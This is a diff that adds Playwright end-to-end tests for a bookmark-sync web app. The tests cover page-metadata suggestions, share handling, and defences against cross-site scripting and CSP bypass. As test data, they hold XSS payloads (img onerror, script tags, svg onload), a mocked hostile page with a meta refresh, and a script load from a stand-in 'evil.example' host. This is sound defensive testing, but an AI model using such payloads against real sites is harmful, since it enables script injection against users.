@@ -1,3 +1,5 @@
+import { readFile } from 'node:fs/promises';
+import { fileURLToPath } from 'node:url';
 import { type BrowserContext, expect, type Page, test } from '@playwright/test';
 import {
   BookmarkContainer,
@@ -462,6 +464,373 @@ test('descriptions and tags survive a pull, are searchable, and are not stripped
   const uploaded = pushed[0]!.children!.find((node) => node.url === 'https://caniuse.com/')!;
   expect(uploaded.description).toBe('Browser support tables');
   expect(uploaded.tags).toEqual(['compat', 'reference']);
+
+  await ctx.close();
+});
+
+/**
+ * Serves a page whose `<meta>` tags are what the suggestion is supposed to find, with
+ * the CORS header that makes it readable from the app's origin at all.
+ *
+ * That header is the whole reason this has to be mocked: a real site almost never sends
+ * it, which is exactly the limitation `readPageMetadata` documents. Mocking it here
+ * tests the path that runs when a site does allow the read — the parsing, the
+ * precedence and the fill-only-what-is-empty rule — rather than pretending the common
+ * case is a hit.
+ */
+async function serveMetaPage(context: BrowserContext, url: string): Promise<void> {
+  await context.route(url, (route) =>
+    route.fulfill({
+      status: 200,
+      contentType: 'text/html; charset=utf-8',
+      headers: { 'access-control-allow-origin': '*' },
+      body: `<!doctype html><html><head>
+        <title>Caniuse</title>
+        <meta name="description" content="The plain description, which loses.">
+        <meta property="og:description" content="Support tables for HTML5, CSS3 and more">
+        <meta name="keywords" content="Compat, browser support ,, COMPAT, css">
+      </head><body>ignored</body></html>`,
+    }),
+  );
+}
+
+test('the add form suggests the page description and tags, and only fills empty fields', async ({
+  browser,
+}) => {
+  const state: ServerState = {
+    blob: await encryptTree(SEEDED),
+    lastUpdated: new Date('2024-01-01T00:00:00.000Z').toISOString(),
+    version: '1.1.13',
+  };
+  const ctx = await browser.newContext();
+  await installApiMock(ctx, state);
+  const SUGGESTED = 'https://caniuse.com/suggested';
+  await serveMetaPage(ctx, SUGGESTED);
+  const page = await ctx.newPage();
+  await page.goto('/');
+  await login(page);
+
+  // Entering the URL is what triggers the read: the fields fill themselves, and the
+  // hint says the values are a suggestion rather than something already recorded.
+  await page.getByTestId('addUrl').fill(SUGGESTED);
+  await page.getByTestId('addUrl').blur();
+
+  // og:description wins over the plain `description` meta, matching the extension.
+  await expect(page.getByTestId('addDescription')).toHaveValue(
+    'Support tables for HTML5, CSS3 and more',
+  );
+  // Keywords are normalised by core: trimmed, de-duplicated case-insensitively (the
+  // second "COMPAT" is dropped), empties removed and sorted into canonical order.
+  await expect(page.getByTestId('addTags')).toHaveValue('browser support, compat, css');
+  await expect(page.getByTestId('addHint')).toContainText(/suggested/i);
+  await expect(page.getByTestId('addDescriptionCount')).toContainText('39 / 300');
+
+  // What the user typed is never overwritten by the page's own claims. A second URL
+  // with the same metadata leaves both fields exactly as they are now.
+  await page.getByTestId('addDescription').fill('Mine, not the page’s');
+  await page.getByTestId('addTags').fill('keep');
+  const SECOND = 'https://caniuse.com/second';
+  await serveMetaPage(ctx, SECOND);
+  await page.getByTestId('addUrl').fill(SECOND);
+  await page.getByTestId('addUrl').blur();
+  await expect(page.getByTestId('addTags')).toHaveValue('keep');
+  await expect(page.getByTestId('addDescription')).toHaveValue('Mine, not the page’s');
+
+  // Saving puts both into the tree that goes up, so the suggestion the user accepted
+  // reaches every other device rather than living in this browser.
+  await page.getByTestId('addTitle').fill('Caniuse');
+  await page.getByTestId('addSubmit').click();
+  await expect(page.getByTestId('addMessage')).toHaveText(/synced/i);
+
+  const item = page.getByTestId('bookmarkItem').filter({ hasText: 'Caniuse' });
+  await expect(item).toContainText('Mine, not the page’s');
+  await expect(item).toContainText('keep');
+
+  const pushed = JSON.parse(await decryptTree(state.blob)) as {
+    children?: { url?: string; description?: string; tags?: string[] }[];
+  }[];
+  const uploaded = pushed
+    .flatMap((container) => container.children ?? [])
+    .find((node) => node.url === SECOND)!;
+  expect(uploaded.description).toBe('Mine, not the page’s');
+  expect(uploaded.tags).toEqual(['keep']);
+
+  // The form is emptied for the next bookmark, suggestion and hint included.
+  await expect(page.getByTestId('addDescription')).toHaveValue('');
+  await expect(page.getByTestId('addTags')).toHaveValue('');
+  await expect(page.getByTestId('addHint')).toHaveText('');
+
+  await ctx.close();
+});
+
+test('a share with text records it as the description; a share without a title still names the bookmark', async ({
+  browser,
+}) => {
+  const state: ServerState = {
+    blob: await encryptTree(SEEDED),
+    lastUpdated: new Date('2024-01-01T00:00:00.000Z').toISOString(),
+    version: '1.1.13',
+  };
+  const ctx = await browser.newContext();
+  await installApiMock(ctx, state);
+  const page = await ctx.newPage();
+  await page.goto('/');
+  await login(page);
+  await expect(page.getByTestId('bookmarkItem')).toHaveCount(2);
+
+  // A share sheet carries the page's excerpt as its text. It is the only bookmark
+  // metadata a share can deliver, and the share itself is the confirmation, so it is
+  // stored rather than offered.
+  await page.evaluate(() =>
+    window.marksyncReceiveSharedUrl(
+      'https://example.com/shared',
+      'Shared Link',
+      'What the share sheet said about the page',
+    ),
+  );
+  const shared = page.getByTestId('bookmarkItem').filter({ hasText: 'Shared Link' });
+  await expect(shared).toContainText('What the share sheet said about the page');
+
+  // A share whose text is just the link again would make a description of the URL, so
+  // it is dropped instead.
+  await page.evaluate(() =>
+    window.marksyncReceiveSharedUrl(
+      'https://example.com/echoed',
+      'Echoed',
+      'https://example.com/echoed',
+    ),
+  );
+  const echoed = page.getByTestId('bookmarkItem').filter({ hasText: 'Echoed' });
+  await expect(echoed).toHaveCount(1);
+  await expect(echoed.locator('.description')).toHaveCount(0);
+
+  // The ?share… query params take the same path. With no title the text names the
+  // bookmark, as it did before there was a description to put it in.
+  await page.goto(
+    '/?shareUrl=https%3A%2F%2Fexample.com%2Fvia-params&shareText=Only%20text%20was%20shared',
+  );
+  await expect(page.getByTestId('bookmarkList')).toBeVisible();
+  const viaParams = page.getByTestId('bookmarkItem').filter({ hasText: 'Only text was shared' });
+  await expect(viaParams).toHaveCount(1);
+  await expect(viaParams.locator('.description')).toHaveCount(0);
+
+  const pushed = JSON.parse(await decryptTree(state.blob)) as {
+    children?: { url?: string; description?: string }[];
+  }[];
+  const nodes = pushed.flatMap((container) => container.children ?? []);
+  expect(nodes.find((n) => n.url === 'https://example.com/shared')?.description).toBe(
+    'What the share sheet said about the page',
+  );
+  expect(nodes.find((n) => n.url === 'https://example.com/echoed')?.description).toBeUndefined();
+
+  await ctx.close();
+});
+
+// Injection payloads, one per field that a bookmark can carry. Titles, descriptions and
+// tags are free text: core bounds and normalises them but never strips markup from them
+// (nor should it — a bookmark whose title really is `<b>x</b>` must keep it), so the
+// guarantee has to hold at the point they are rendered.
+const XSS_TITLE = '<img src=x onerror="window.__pwned=1">TitlePayload';
+const XSS_DESCRIPTION = '</div><script>window.__pwned=1</script>DescPayload';
+const XSS_TAG = '<svg onload="window.__pwned=1">TagPayload';
+
+test('markup in a title, description or tag is rendered as text, never as HTML', async ({
+  browser,
+}) => {
+  // Arrives the way a hostile value realistically would: written by another client and
+  // pulled out of the sync, so it has crossed core and reaches the renderer intact.
+  const hostile = [newBookmark(BookmarkContainer.Toolbar)];
+  const toolbar = getContainer(BookmarkContainer.Toolbar, hostile, true)!;
+  toolbar.children = [
+    newBookmark(XSS_TITLE, 'https://example.com/hostile', XSS_DESCRIPTION, [XSS_TAG]),
+  ];
+
+  const state: ServerState = {
+    blob: await encryptCustomTree(hostile),
+    lastUpdated: new Date('2024-01-01T00:00:00.000Z').toISOString(),
+    version: '1.1.13',
+  };
+  const ctx = await browser.newContext();
+  await installApiMock(ctx, state);
+  const page = await ctx.newPage();
+  const errors: string[] = [];
+  page.on('pageerror', (error) => errors.push(error.message));
+  await page.goto('/');
+  await login(page);
+
+  // Each payload is present as literal text, which is only possible if it went through a
+  // text node rather than being parsed as markup.
+  const item = page.getByTestId('bookmarkItem').filter({ hasText: 'TitlePayload' });
+  await expect(item).toHaveCount(1);
+  await expect(item).toContainText(XSS_TITLE);
+  await expect(item).toContainText(XSS_DESCRIPTION);
+  await expect(item).toContainText(XSS_TAG);
+
+  // Nothing was injected: no element the payloads would have created exists, and no
+  // handler on any of them ran.
+  expect(await page.locator('#app img[src="x"], #app svg, #app script').count()).toBe(0);
+  expect(await page.evaluate(() => '__pwned' in window)).toBe(false);
+  expect(errors).toEqual([]);
+
+  // The same values survive a round trip through the add form, which is the other way in.
+  await page.getByTestId('addTitle').fill(XSS_TITLE);
+  await page.getByTestId('addUrl').fill('https://example.com/typed');
+  await page.getByTestId('addDescription').fill(XSS_DESCRIPTION);
+  await page.getByTestId('addTags').fill(XSS_TAG);
+  await page.getByTestId('addSubmit').click();
+  await expect(page.getByTestId('addMessage')).toHaveText(/synced/i);
+  expect(await page.evaluate(() => '__pwned' in window)).toBe(false);
+  expect(await page.locator('#app img[src="x"], #app svg, #app script').count()).toBe(0);
+
+  // Searching renders the same values down a second code path (flat list + breadcrumb).
+  await page.getByTestId('search').fill('TagPayload');
+  await expect(page.getByTestId('bookmarkItem')).toHaveCount(2);
+  expect(await page.evaluate(() => '__pwned' in window)).toBe(false);
+  expect(errors).toEqual([]);
+
+  await ctx.close();
+});
+
+test('a hostile page cannot inject through the metadata it suggests', async ({ browser }) => {
+  const state: ServerState = {
+    blob: await encryptTree(SEEDED),
+    lastUpdated: new Date('2024-01-01T00:00:00.000Z').toISOString(),
+    version: '1.1.13',
+  };
+  const ctx = await browser.newContext();
+  await installApiMock(ctx, state);
+
+  // The suggestion reads a document the app does not control, so the page gets to choose
+  // the bytes: a script that would run if the markup were ever live, markup inside the
+  // meta content itself, and a redirect that must not be followed.
+  const HOSTILE = 'https://hostile.example/page';
+  await ctx.route(HOSTILE, (route) =>
+    route.fulfill({
+      status: 200,
+      contentType: 'text/html; charset=utf-8',
+      headers: { 'access-control-allow-origin': '*' },
+      body: `<!doctype html><html><head>
+        <script>window.__pwned = 1;</script>
+        <meta http-equiv="refresh" content="0;url=https://elsewhere.example/">
+        <meta property="og:description" content='</textarea><img src=x onerror="window.__pwned=1">Suggested'>
+        <meta name="keywords" content='<svg onload="window.__pwned=1">, ok'>
+        <img src="https://tracker.example/pixel.gif">
+      </head><body></body></html>`,
+    }),
+  );
+  // Nothing in the fetched document may cause a request of its own. Any hit here means
+  // the markup was made live rather than parsed inert.
+  let subresources = 0;
+  await ctx.route('https://tracker.example/**', (route) => {
+    subresources += 1;
+    return route.abort();
+  });
+  await ctx.route('https://elsewhere.example/**', (route) => {
+    subresources += 1;
+    return route.abort();
+  });
+
+  const page = await ctx.newPage();
+  const errors: string[] = [];
+  page.on('pageerror', (error) => errors.push(error.message));
+  await page.goto('/');
+  const origin = new URL(page.url()).origin;
+  await login(page);
+
+  await page.getByTestId('addUrl').fill(HOSTILE);
+  await page.getByTestId('addUrl').blur();
+
+  // The suggestion still arrives — it is just inert text in a form field.
+  await expect(page.getByTestId('addDescription')).toHaveValue(/Suggested$/);
+  await expect(page.getByTestId('addTags')).toHaveValue(/ok/);
+
+  expect(await page.evaluate(() => '__pwned' in window)).toBe(false);
+  expect(await page.locator('#app img[src="x"], #app svg, #app script').count()).toBe(0);
+  expect(subresources).toBe(0);
+  // The app is still on its own origin: no meta refresh was honoured.
+  expect(new URL(page.url()).origin).toBe(origin);
+  await expect(page.getByTestId('addForm')).toBeVisible();
+  expect(errors).toEqual([]);
+
+  await ctx.close();
+});
+
+test('the CSP is served in both forms and blocks script the renderer would not', async ({
+  browser,
+}) => {
+  const ctx = await browser.newContext();
+  const page = await ctx.newPage();
+  // Violations are the direct evidence: the browser reports which directive refused what.
+  const violations: string[] = [];
+  await page.addInitScript(() => {
+    document.addEventListener('securitypolicyviolation', (event) => {
+      ((window as unknown as { __violations: string[] }).__violations ??= []).push(
+        event.violatedDirective,
+      );
+    });
+  });
+  await page.goto('/');
+
+  const metaPolicy = await page
+    .locator('meta[http-equiv="Content-Security-Policy"]')
+    .getAttribute('content');
+  expect(metaPolicy).toContain("script-src 'self'");
+  expect(metaPolicy).not.toContain('unsafe-eval');
+  // 'unsafe-inline' is permitted for style *attributes* only, so the bare token must not
+  // appear in script-src or style-src.
+  expect(metaPolicy).toContain("style-src-attr 'unsafe-inline'");
+  expect(metaPolicy).not.toMatch(/script-src [^;]*unsafe-inline/);
+  expect(metaPolicy).not.toMatch(/style-src [^;]*unsafe-inline/);
+
+  // Inline script: what an innerHTML sink would give an attacker. Blocked, so a future
+  // one is a console error rather than an exploit.
+  const inlineRan = await page.evaluate(async () => {
+    const script = document.createElement('script');
+    script.textContent = 'window.__cspBypassed = true;';
+    document.head.append(script);
+    await new Promise((resolve) => setTimeout(resolve, 50));
+    return '__cspBypassed' in window;
+  });
+  expect(inlineRan).toBe(false);
+
+  // A script from another origin, which is how a compromised dependency would phone home.
+  const externalRan = await page.evaluate(async () => {
+    const script = document.createElement('script');
+    script.src = 'https://evil.example/payload.js';
+    document.head.append(script);
+    await new Promise((resolve) => setTimeout(resolve, 100));
+    return script.dataset.loaded === 'yes';
+  });
+  expect(externalRan).toBe(false);
+
+  violations.push(
+    ...(await page.evaluate(() => (window as unknown as { __violations?: string[] }).__violations ?? [])),
+  );
+  // Reported as `script-src-elem`, the directive that inherits from `script-src` for
+  // <script> elements specifically — one violation for each of the two attempts above.
+  expect(violations).toHaveLength(2);
+  expect(violations.every((directive) => directive.startsWith('script-src'))).toBe(true);
+
+  // The production form is a real header, generated from the same list, so the two must
+  // agree on everything except the directives a meta tag cannot express.
+  const headersFile = await readFile(
+    fileURLToPath(new URL('../dist/_headers', import.meta.url)),
+    'utf8',
+  );
+  const headerPolicy = /^\s*Content-Security-Policy:\s*(.+)$/m.exec(headersFile)?.[1]?.trim();
+  expect(headerPolicy).toBeTruthy();
+  expect(headerPolicy).toContain("frame-ancestors 'none'");
+  const withoutFrameAncestors = headerPolicy!
+    .split(';')
+    .map((directive) => directive.trim())
+    .filter((directive) => !directive.startsWith('frame-ancestors'))
+    .join('; ');
+  expect(withoutFrameAncestors).toBe(metaPolicy);
+
+  // The headers that only exist in the served form.
+  expect(headersFile).toContain('X-Frame-Options: DENY');
+  expect(headersFile).toContain('X-Content-Type-Options: nosniff');
+  expect(headersFile).toContain('Referrer-Policy: no-referrer');
 
   await ctx.close();
 });
